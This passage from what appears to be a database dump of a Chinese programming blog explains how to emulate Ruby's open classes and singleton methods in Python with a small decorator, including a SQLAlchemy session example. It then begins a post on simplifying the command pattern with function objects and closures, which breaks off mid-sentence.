class="k">print</span> <span class="n">Spam</span><span class="o">.</span><span class="n">egg</span> <span class="c"># output: &lt;unbound method Spam.egg&gt;</span>\n<span class="k">print</span> <span class="n">Spam</span><span class="o">.</span><span class="n">egg</span><span class="o">.</span><span class="n">im_func</span> <span class="c"># output: &lt;function egg at 0x02105630&gt;</span>\n</pre></div>\n</figure><p>这点似乎阻碍了我们以直接向类中添加函数的方式添加函数，其实不然，如果我们写一个自由函数，然后添加到类中，这个函数就会被自动包装成未绑定方法对象。</p>\n<figure class="code"><div class="highlight"><pre><span class="c"># in python 2.x</span>\n<span class="k">def</span> <span class="nf">egg2</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n    <span class="k">pass</span>\n<span class="n">Spam</span><span class="o">.</span><span class="n">egg2</span> <span class="o">=</span> <span class="n">egg2</span>\n<span class="k">print</span> <span class="n">Spam</span><span class="o">.</span><span class="n">egg2</span> <span class="c"># output: &lt;unbound method Spam.egg2&gt;</span>\n</pre></div>\n</figure><p>我认为是类的 <tt class="docutils literal">__setattr__</tt> 产生了这样的作用。无论是什么原因，我们确定了一点—— Python 2.x 的“未绑定方法”不会干扰我们以正常思维模式实现 OpenClass。</p>\n<p>当然，如果用的是 Python 3.x，未绑定方法问题就不存在了。我们使用属性访问的方式直接向类中添加方法，是可以同时兼容 Python 2.x 和 Python 3.x 的。</p>\n</div>\n</div>\n<div class="section" id="id5">\n<h2>实现</h2>\n<p>有了上述基础，我们可以开始编写一个 utils.py 模块，实现 OpenClass 和特异方法。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">partial</span>\n\n<span class="k">def</span> <span class="nf">attach_method</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>\n    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="nb">type</span><span class="p">):</span>\n        <span class="k">def</span> <span class="nf">decorator</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>\n            <span class="nb">setattr</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">func</span><span class="o">.</span><span class="n">__name__</span><span class="p">,</span> <span class="n">func</span><span class="p">)</span>\n    <span class="k">else</span><span class="p">:</span>\n        <span class="k">def</span> <span class="nf">decorator</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>\n            <span class="nb">setattr</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">func</span><span class="o">.</span><span class="n">__name__</span><span class="p">,</span> <span class="n">partial</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">target</span><span class="p">))</span>\n    <span class="k">return</span> <span class="n">decorator</span>\n</pre></div>\n</figure><p>上述代码中的 attach_method 装饰器在内部对装饰目标做出装饰之前，先用 <tt class="docutils literal">isinstance(target, type)</tt> 判断目标是否是一个“类”，即“元类” <tt class="docutils literal">type</tt> 的实例。如果是类，则视为 OpenClass，将被装饰函数用 <tt class="docutils literal">setattr</tt> 放置到类中；如果不是类，则视为特异方法，手动构造一个偏函数去掉 self 参数，在放到实例中。</p>\n<p>然后我们就可以编写简单的测试：</p>\n<figure class="code"><div class="highlight"><pre><span class="k">class</span> <span class="nc">Spam</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="k">pass</span>\n\n<span class="nd">@attach_method</span><span class="p">(</span><span class="n">Spam</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">egg1</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>\n    <span class="k">print</span><span class="p">((</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>\n\n<span class="n">spam1</span> <span class="o">=</span> <span class="n">Spam</span><span class="p">()</span>\n<span class="c"># OpenClass 加入的方法 egg1 可用</span>\n<span class="n">spam1</span><span class="o">.</span><span class="n">egg1</span><span class="p">(</span><span class="s">&quot;Test1&quot;</span><span class="p">)</span>\n\n<span class="n">spam2</span> <span class="o">=</span> <span class="n">Spam</span><span class="p">()</span>\n<span class="nd">@attach_method</span><span class="p">(</span><span class="n">spam2</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">egg2</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>\n    <span class="k">print</span><span class="p">((</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>\n<span class="c"># 因为是 OpenClass，所以 egg1 对 spam2 实例也有效</span>\n<span class="n">spam2</span><span class="o">.</span><span class="n">egg1</span><span class="p">(</span><span class="s">&quot;Test2&quot;</span><span class="p">)</span>\n<span class="c"># 特异方法 egg2</span>\n<span class="n">spam2</span><span class="o">.</span><span class="n">egg2</span><span class="p">(</span><span class="s">&quot;Test3&quot;</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>\n\n<span class="c"># egg2 是 spam2 的特异方法，在 spam1 中不可用</span>\n<span class="c"># 这里会抛出一个 AttributeError 异常</span>\n<span class="n">spam1</span><span class="o">.</span><span class="n">egg2</span><span class="p">(</span><span class="s">&quot;Test3&quot;</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>\n</pre></div>\n</figure></div>\n<div class="section" id="id6">\n<h2>实际用途</h2>\n<p>有了这个数行的简单工具，我们就可以在其他地方展现 OpenClass 和特异方法的便捷了。例如对于 SQLAlchemy 的 Session，我们一般的用法是操作结束领域对象，然后调用 commit 方法提交工作单元。我们希望能够用 Python 的 with 上下文管理方式完成这个工作，但是 SQLAlchemy 的 Session 默认并没有实现 <tt class="docutils literal">__enter__</tt> 和 <tt class="docutils literal">__exit__</tt> 协议，我们就可以通过 OpenClass 加入该实现。</p>\n<figure class="code"><div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>\n<span class="c">#-*- coding:utf-8 -*-</span>\n\n<span class="kn">from</span> <span class="nn">sqlalchemy</span> <span class="kn">import</span> <span class="n">create_engine</span>\n<span class="kn">from</span> <span class="nn">sqlalchemy.orm</span> <span class="kn">import</span> <span class="n">sessionmaker</span>\n<span class="kn">from</span> <span class="nn">utils</span> <span class="kn">import</span> <span class="n">attach_method</span>\n\n<span class="n">engine</span> <span class="o">=</span> <span class="n">create_engine</span><span class="p">(</span><span class="s">''sqlite:///:memory:''</span><span class="p">,</span> <span class="n">echo</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>\n<span class="n">Session</span> <span class="o">=</span> <span class="n">sessionmaker</span><span class="p">(</span><span class="n">bind</span><span class="o">=</span><span class="n">engine</span><span class="p">)</span>\n\n<span class="nd">@attach_method</span><span class="p">(</span><span class="n">Session</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">__enter__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n    <span class="k">return</span> <span class="bp">self</span>\n\n<span class="nd">@attach_method</span><span class="p">(</span><span class="n">Session</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">__exit__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="n">err_type</span><span class="p">,</span> <span class="n">err_tb</span><span class="p">):</span>\n    <span class="k">if</span> <span class="ow">not</span> <span class="n">err</span><span class="p">:</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>\n    <span class="k">else</span><span class="p">:</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">rollback</span><span class="p">()</span>\n</pre></div>\n</figure><p>加入了 <tt class="docutils literal">__enter__</tt> 和 <tt class="docutils literal">__exit__</tt> 协议后，使用起来就便捷的多了。</p>\n<figure class="code"><div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>\n<span class="c">#-*- coding:utf-8 -*-</span>\n\n<span class="k">with</span> <span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">db</span><span class="p">:</span>\n    <span class="n">post</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">Post</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">post_id</span><span class="p">)</span>\n    <span class="n">new_comment</span> <span class="o">=</span> <span class="n">Comment</span><span class="p">(</span><span class="n">comment_content_text</span><span class="p">)</span>\n    <span class="n">post</span><span class="o">.</span><span class="n">add_comment</span><span class="p">(</span><span class="n">new_comment</span><span class="p">)</span>\n    <span class="n">db</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">new_comment</span><span class="p">)</span>\n</pre></div>\n</figure><p>特异方法也是类似的使用场景，不过特异方法针对的是特定实例而不是整个类。</p>\n<table class="docutils footnote" frame="void" id="id8" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id2">[1]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/zh-cn/%E4%BF%AE%E9%A5%B0%E6%A8%A1%E5%BC%8F">维基百科上关于装饰器模式的词条</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id10" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id3">[2]</a></td><td><a class="reference external" href="http://www.cnblogs.com/huxi/archive/2011/06/24/2089358.html">AstralWind 关于 Python 函数介绍的博客</a></td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2012-01-17 12:02:00', '2012-01-17 12:02:00', 0, '[["__", 0.2255616509981132], ["Python", 0.21146404781073114], ["self", 0.21146404781073114], ["\\u65b9\\u6cd5", 0.19918086205349056], ["def", 0.19736644462334907], ["\\u51fd\\u6570", 0.19213521313884435], ["\\u5b9e\\u4f8b", 0.17163503032528302], ["method", 0.1691712382485849], ["OpenClass", 0.1691712382485849], ["Spam", 0.15507363506120284], ["egg2", 0.14097603187382074], ["\\u7279\\u5f02", 0.13032070428891507], ["Ruby", 0.09868322231167453], ["func", 0.09868322231167453], ["attach", 0.09868322231167453], ["egg", 0.09868322231167453], ["\\u7ed1\\u5b9a", 0.09682161785094338], ["spam2", 0.08458561912429245], ["target", 0.08458561912429245], ["print", 0.08458561912429245]]', NULL, NULL, 'Ruby 中的 OpenClass 是个非常方便的特性，我们可以扩充一个已有的类，往里面添加方法。甚至还能脱离类，向实例中添加该实例独有的方法，称为“特异方法”。这种做法的前提是语言具有足够的动态特性，能够运行时更改语言结构，所谓“ 元编程 ”（Meta-Programming）能力。\nPython 也有类似的能力，但是不像 Ruby 有原生的语法支持。在 Python 中实现 OpenClass 和特异方法基本原理与 Ruby 中的原理类似——“函数、方法也是一种对象”。\n本文只讨论 Python 的 新式类 ，对于 old-style class 保持无视。\n\n\nRuby 中的 OpenClass 与特异方法\nOpenClass 即在一个类已经完成定义之后，再次向其中添加方法。在 Ruby 中的实现方法就是定义同名类。在 Ruby 中定义同名类不会像 Java 一样被认为是编译错误，也不会像 Python 一样“新定义的类覆盖旧类”，而是把同名类中定义的方法全部附加到已定义的旧类中。以下为示例代码：\nclass Foo\n  def m1()\n    puts "m1 has been called"\n  end\nend\n\nclass Foo\n  def m2()\n    puts "m2 has been called"\n  end\nend\n\nfoo = Foo.new\nfoo.m1\nfoo.m2\n\n特异方法和 OpenClass 有点类似，不过附加的方法不是附加到类中，而是附加到特定的实例中。被附加的方法仅仅在目标实例中存在，不会影响该类的其他实例。示例代码：\nfoo = Foo.new\ndef foo.m3()\n  puts "m3 has been called"\nend\n\nfoo.m3\n\n\n\nPython 方法探幽\n\n从函数到绑定方法\nPython 中定义方法，和写一个函数是大致相同的，唯一的不同之处有两点：第一，作为方法的函数必须嵌套在类的结构里；第二，作为方法的函数第一个参数必须为 self。\n在一个 Python 类实例化生产出一个实例的时候，类中的所有“函数”都会被包装一层再放到实例的成员字典里（装饰器模式 [1] ）。包装层除了添加了一些元信息之外，还对原始的函数做了“装饰”，装饰的效果为“偏函数”。\n\n通过为已经存在的某个函数指定数个参数，生成一个新的函数，这个函数只需要传入剩余未指定的参数就能实现原函数的全部功能，这被称为偏函数。—— AstralWind [2]\n也就是说，对于类中有 n 个参数的函数，实例中会有对应的可调用（callable）对象，接受 n-1 个参数的调用。被省略的那个参数就是 self —— 在偏函数化的过程中被赋予了当前实例。\n概念上来说，可以把这个包装过程用如下代码大致模拟（仅仅是概念上）：\ndef unbound_method(self, arg1, arg2):\n    pass\n\n# 对于 obj1 中的绑定方法\ndef bound_method(arg1, arg2):\n    return unbound_method(obj1, arg1, arg2)\n\n掌握了 Python 的这个特点，我们就可以模拟语言内置的“方法绑定”过程，实现模拟 Ruby 的“特异方法”。\n\n\n未绑定方法\n如果使用的是 py3k，嵌套定义在类中的函数和定义在全局作用域的函数是没有区别的。类实例化出实例的时候，“方法绑定”的过程也是基于这种 raw function。但是 Python 2.x 的处理方式有所区别，尝试一下便知：\n# in python 2.x\nclass Spam(object):\n    def egg(self):\n        pass\n\n    print egg # output: <function egg at 0x02105630>\n\nprint Spam.egg # output: <unbound method Spam.egg>\nprint Spam.egg.im_func # output: <function egg at 0x02105630>\n\n这点似乎阻碍了我们以直接向类中添加函数的方式添加函数，其实不然，如果我们写一个自由函数，然后添加到类中，这个函数就会被自动包装成未绑定方法对象。\n# in python 2.x\ndef egg2(self):\n    pass\nSpam.egg2 = egg2\nprint Spam.egg2 # output: <unbound method Spam.egg2>\n\n我认为是类的 __setattr__ 产生了这样的作用。无论是什么原因，我们确定了一点—— Python 2.x 的“未绑定方法”不会干扰我们以正常思维模式实现 OpenClass。\n当然，如果用的是 Python 3.x，未绑定方法问题就不存在了。我们使用属性访问的方式直接向类中添加方法，是可以同时兼容 Python 2.x 和 Python 3.x 的。\n\n\n\n实现\n有了上述基础，我们可以开始编写一个 utils.py 模块，实现 OpenClass 和特异方法。\nfrom functools import partial\n\ndef attach_method(target):\n    if isinstance(target, type):\n        def decorator(func):\n            setattr(target, func.__name__, func)\n    else:\n        def decorator(func):\n            setattr(target, func.__name__, partial(func, target))\n    return decorator\n\n上述代码中的 attach_method 装饰器在内部对装饰目标做出装饰之前，先用 isinstance(target, type) 判断目标是否是一个“类”，即“元类” type 的实例。如果是类，则视为 OpenClass，将被装饰函数用 setattr 放置到类中；如果不是类，则视为特异方法，手动构造一个偏函数去掉 self 参数，在放到实例中。\n然后我们就可以编写简单的测试：\nclass Spam(object):\n    pass\n\n@attach_method(Spam)\ndef egg1(self, name):\n    print((self, name))\n\nspam1 = Spam()\n# OpenClass 加入的方法 egg1 可用\nspam1.egg1("Test1")\n\nspam2 = Spam()\n@attach_method(spam2)\ndef egg2(self, name, num):\n    print((self, name, num))\n# 因为是 OpenClass，所以 egg1 对 spam2 实例也有效\nspam2.egg1("Test2")\n# 特异方法 egg2\nspam2.egg2("Test3", 3)\n\n# egg2 是 spam2 的特异方法，在 spam1 中不可用\n# 这里会抛出一个 AttributeError 异常\nspam1.egg2("Test3", 3)\n\n\n\n实际用途\n有了这个数行的简单工具，我们就可以在其他地方展现 OpenClass 和特异方法的便捷了。例如对于 SQLAlchemy 的 Session，我们一般的用法是操作结束领域对象，然后调用 commit 方法提交工作单元。我们希望能够用 Python 的 with 上下文管理方式完成这个工作，但是 SQLAlchemy 的 Session 默认并没有实现 __enter__ 和 __exit__ 协议，我们就可以通过 OpenClass 加入该实现。\n#!/usr/bin/env python\n#-*- coding:utf-8 -*-\n\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\nfrom utils import attach_method\n\nengine = create_engine(''sqlite:///:memory:'', echo=True)\nSession = sessionmaker(bind=engine)\n\n@attach_method(Session)\ndef __enter__(self):\n    return self\n\n@attach_method(Session)\ndef __exit__(self, err, err_type, err_tb):\n    if not err:\n        self.commit()\n    else:\n        self.rollback()\n\n加入了 __enter__ 和 __exit__ 协议后，使用起来就便捷的多了。\n#!/usr/bin/env python\n#-*- coding:utf-8 -*-\n\nwith Session() as db:\n    post = db.query(Post).get(post_id)\n    new_comment = Comment(comment_content_text)\n    post.add_comment(new_comment)\n    db.add(new_comment)\n\n特异方法也是类似的使用场景，不过特异方法针对的是特定实例而不是整个类。\n\n\n\n[1]维基百科上关于装饰器模式的词条\n\n\n\n\n\n[2]AstralWind 关于 Python 函数介绍的博客\n\n\n', NULL, NULL, NULL),
(96, 'https://blog.tonyseek.com/post/concise-command-pattern/', '先让简单的命令模式消失吧', '<p>最近读《Ruby 设计模式》 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id13" id="id2">[1]</a> （第 n 次重读），对其中的一个观点特别认同：设计模式终将随着语言抽象能力的强化而消失在代码中。正如作者曾经在 C 语言中用函数指针结构体管理操作特定结构体的“面向对象设计模式”，随着面向对象融入语言而消失。GoF 的设计模式很经典，但是在 Ruby、Python 等表达力强大的语言火热之后，部分原来可以称之为“模式”的做法已经开始有了融入语言的趋势。</p>\n<p>虽然这篇博客讨论的是命令模式，但我不会再絮叨一边命令模式是什么，已经有非常详细的资料 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id14" id="id3">[2]</a> 在先了。我想讨论的是关于在相对传统高级语言更“高级”的语言中，命令模式更佳的实现方式。这类语言包括但不限于：Python、Ruby、Scala、JavaScript。</p>\n\n<div class="section" id="id4">\n<h2>代码块与函数对象</h2>\n<p>JavaScript、Ruby、Python 等动态语言对比 Java 有个很大的不同，就是让“过程”成了一种可以传递、修改甚至可以向它发送消息的对象。在 Ruby 中，这种对象称之为 Proc（本文称为“代码块”）；Python 和 JavaScript 中，任何一个函数和 lambda 表达式都是这样的对象。这种对象其实就是许多动态语言都有的“匿名函数” <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id15" id="id5">[3]</a> 。</p>\n<p>这种特性给了我们将过程保存为对象的可能性。在 C/C++ 里面也有函数指针的概念，但 C/C++ 并不支持随处定义过程，只能把全局定义好的函数用函数指针引用，所以相比之下 Ruby&amp;Python 的这种特性能带来更多的便捷。这种便捷带给我们的，是可以让一部分 GoF 设计模式实现简化，因为 GoF 模式中有大量的行为模式，是和保存过程密切相关的，例如命令模式（Command）、策略模式（Strategy）。</p>\n<p>这种“函数对象”和 GoF 命令模式本质上有相同点：</p>\n<ul class="simple">\n<li>函数（Command 对象）的定义初始化了一个将被执行的过程；</li>\n<li>对这个函数（Command 对象）调用一定的方法（圆括号调用或者发送 execute 消息）会执行预定义好的过程。</li>\n</ul>\n<p>这么一来，我们就有可能用这种“函数对象”替代部分“命令对象”。举个简单的例子，点击一个按钮，触发删除文件的动作。假设 Java 中实现这点所使用的 GUI 框架依赖一个 <tt class="docutils literal">ActionCommand</tt> 接口：</p>\n<figure class="code"><div class="highlight"><pre><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">ActionCommand</span> <span class="o">{</span>\n    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">execute</span><span class="o">();</span>\n<span class="o">}</span>\n</pre></div>\n</figure><p>那么我们要做的就是将删除文件的操作封装为实现了 <tt class="docutils literal">ActionCommand</tt> 接口的命令对象。</p>\n<figure class="code"><div class="highlight"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DeleteFileCommand</span> <span class="kd">implements</span> <span class="n">ActionCommand</span> <span class="o">{</span>\n    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">execute</span><span class="o">()</span> <span class="o">{</span>\n        <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&quot;/tmp/somefile&quot;</span><span class="o">);</span>\n        <span class="k">if</span><span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span> <span class="n">file</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span> <span class="o">}</span>\n    <span class="o">}</span>\n<span class="o">}</span>\n</pre></div>\n</figure><p>最终使用的时候，讲这个命令对象实例化并传递给 GUI 框架即可。</p>\n<figure class="code"><div class="highlight"><pre><span class="c1">// omit...</span>\n<span class="n">button</span><span class="o">.</span><span class="na">setClickAction</span><span class="o">(</span><span class="k">new</span> <span class="n">DeleteFileCommand</span><span class="o">());</span>\n<span class="c1">// omit...</span>\n\n<span class="c1">// 我们知道 GUI 框架内部会在按钮被点击的时候执行这个命令：</span>\n<span class="n">ActionCommand</span> <span class="n">clickAction</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">clickAction</span><span class="o">;</span>\n<span class="n">clickAction</span><span class="o">.</span><span class="na">execute</span><span class="o">();</span>\n</pre></div>\n</figure><p>实现有些繁琐，但是我们在 Java 中似乎也较难找到更好的实现方式，毕竟我们要做到的是“保存一个过程，需要的时候才执行”。但是如果在 Python 中呢？我想大多数 Pythoner 不会选择去这么繁琐的方式，因为这样不 Pythonic。事实上，这样不仅不 Pythonic，也不 Ruby Style、JavaScript Style。在支持函数对象（或者代码块、匿名函数，随便怎么叫）的语言中，我们都可以选择更简单、更直观的方式。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">os</span>\n<span class="kn">import</span> <span class="nn">ttk</span>  <span class="c"># ``from tkinter import ttk`` for py3k</span>\n\n<span class="k">def</span> <span class="nf">deletefile</span><span class="p">():</span>\n    <span class="n">path</span> <span class="o">=</span> <span class="s">&quot;/tmp/somefile&quot;</span>\n    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>\n        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>\n\n<span class="n">root</span> <span class="o">=</span> <span class="n">ttk</span><span class="o">.</span><span class="n">Frame</span><span class="p">()</span>\n<span class="n">ttk</span><span class="o">.</span><span class="n">Button</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="n">deletefile</span><span class="p">)</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>\n<span class="n">root</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>\n<span class="n">root</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>\n</pre></div>\n</figure><p>这也是我认为简单的命令模式将会融入语言的依据，因为从本质上来看，命令即过程。</p>\n<p>当然，这种用函数对象定义命令的方式也有缺陷。第一个缺陷是对有接口强迫症的同学来说，不定义个接口去约束 Command 会很难受，这点不予评论，我坚持认为会游泳的就是鸭子 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id17" id="id6">[4]</a> ，干嘛非得有鸭子的 DNA。第二个缺陷是如果不能硬编码被删除文件的路径，需要通过参数传入怎么办？或者说的更通用一些，如果命令对象需要传入参数怎么办？在 Java 里面，我们可以：</p>\n<figure class="code"><div class="highlight"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DeleteFileCommand</span> <span class="kd">implements</span> <span class="n">ActionCommand</span> <span class="o">{</span>\n    <span class="kd">private</span> <span class="n">String</span> <span class="n">path</span><span class="o">;</span>\n    <span class="kd">public</span> <span class="nf">DeleteFileCommand</span><span class="o">(</span><span class="n">String</span> <span class="n">path</span><span class="o">)</span> <span class="o">{</span> <span class="k">this</span><span class="o">.</span><span class="na">path</span> <span class="o">=</span> <span class="n">path</span><span class="o">;</span> <span class="o">}</span>\n    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">execute</span><span class="o">()</span> <span class="o">{</span> <span class="cm">/* omit */</span> <span class="o">}</span>\n<span class="o">}</span>\n<span class="n">button</span><span class="o">.</span><span class="na">setClickAction</span><span class="o">(</span><span class="k">new</span> <span class="n">DeleteFileCommand</span><span class="o">(</span><span class="s">&quot;/tmp/somefile&quot;</span><span class="o">));</span>\n</pre></div>\n</figure><p>似乎对于这点函数对象就无能为力了，所以我们这时候需要借助另一个有力的工具——词法闭包。</p>\n</div>\n<div class="section" id="id7">\n<h2>高阶函数与闭包</h2>\n<p>高阶函数似乎是来自函数式编程 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id19" id="id8">[5]</a> 领域的一个概念，简单来说就是调用一个函数，这个函数返回一个函数。这点在 JavaScript 里面实现的最优雅，也最常用：</p>\n<figure class="code"><div class="highlight"><pre><span class="kd">var</span> <span class="nx">pow</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">base</span><span class="p">)</span> <span class="p">{</span>\n  <span class="k">return</span> <span class="kd">function</span><span class="p">(</span><span class="nx">num</span><span class="p">)</span> <span class="p">{</span>\n      <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">num</span><span class="p">;</span>\n      <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">base</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>\n        <span class="nx">result</span> <span class="o">=</span> <span class="nx">result</span><span class="o">*</span><span class="nx">num</span><span class="p">;</span>\n      <span class="p">}</span>\n      <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>\n    <span class="p">};</span>\n<span class="p">}</span>\n\n<span class="kd">var</span> <span class="nx">pow2</span> <span class="o">=</span> <span class="nx">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>\n<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">pow2</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span> <span class="c1">// output: 64</span>\n</pre></div>\n</figure><p>这种特性其实就是“函数对象”的一种体现，它给了我们另一种便捷：通过函数生产函数，也就是通过一个函数来定制 <em>过程</em> 。这种定制本质上和 GoF 设计模式中的许多行为模式是一致的，上面一段计算次方的 JavaScript 可以等价于下面通过类来实现的 Java 代码：</p>\n<figure class="code"><div class="highlight"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Pow</span> <span class="o">{</span>\n    <span class="kd">private</span> <span class="kt">int</span> <span class="n">base</span><span class="o">;</span>\n    <span class="kd">public</span> <span class="nf">Pow</span><span class="o">(</span><span class="kt">int</span> <span class="n">base</span><span class="o">)</span> <span class="o">{</span> <span class="k">this</span><span class="o">.</span><span class="na">base</span> <span class="o">=</span> <span class="n">base</span><span class="o">;</span> <span class="o">}</span>\n    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getValueOf</span><span class="o">(</span><span class="kt">int</span> <span class="n">num</span><span class="o">)</span> <span class="o">{</span>\n        <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">num</span><span class="o">;</span>\n        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="k">this</span><span class="o">.</span><span class="na">base</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span> <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">*</span> <span class="n">num</span><span class="o">;</span> <span class="o">}</span>\n        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>\n    <span class="o">}</span>\n<span class="o">}</span>\n<span class="n">Pow</span> <span class="n">pow2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Pow</span><span class="o">(</span><span class="mi">2</span><span class="o">);</span> <span class="c1">// use it</span>\n<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">pow2</span><span class="o">.</span><span class="na">getValueOf</span><span class="o">(</span><span class="mi">8</span><span class="o">));</span>\n</pre></div>\n</figure><p>这段代码和“函数对象”中的范例有微小的不同——JavaScript 版的 <tt class="docutils literal">pow</tt> 函数成功地等价了 Java 版“带参数构造”的实现。仔细观察 <tt class="docutils literal">pow</tt> 中返回的匿名函数对象，就会发现其中引用了一个属于外部作用域（也就是该匿名函数自身所在作用域）的变量 <tt class="docutils literal">base</tt> 。这样乍看没问题，但是仔细推敲不合逻辑：在内部匿名函数被返回之后， <tt class="docutils literal">pow</tt> 函数的一次调用应该已经结束了，其作用域中的变量应该被回收，为何还在匿名函数中可用呢？这就归结于[词法闭包][4]。在 Python、Ruby、Scala、JavaScript 等语言中，词法闭包一般就称呼为“闭包”，我使用全称是因为我曾被严重困扰过——这里的闭包（Closure） <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id21" id="id9">[6]</a> 和数学中的闭包（也是 Closure） <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id23" id="id10">[7]</a> 没有任何关系。</p>\n<p>维基百科对于这里的闭包定义是这样的：</p>\n<blockquote>\n在计算机科学中，闭包（Closure）是词法闭包（Lexical Closure）的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。</blockquote>\n<p>也就是说，一个高阶函数内部的局部变量，被更深一层作用域的函数（也就是被返回的函数）内部的作用域引用之后，其生命期就会被绑定到内部的函数，只要该内部函数生命期未终结，即使高阶函数的生命期已经终结，该变量仍然活着。换言之，闭包让该过程附带上了额外的数据，这样就让过程在一定的情况下可等同于一个类的实例。关于闭包的这一特性，我听过一个最好的描述，可惜不知道出自谁口：</p>\n<blockquote>\n类实例是绑定了行为的数据，闭包是绑定了数据的行为</blockquote>\n<p>也就是说，对于只有一个行为的类实例（例如简单的 Command 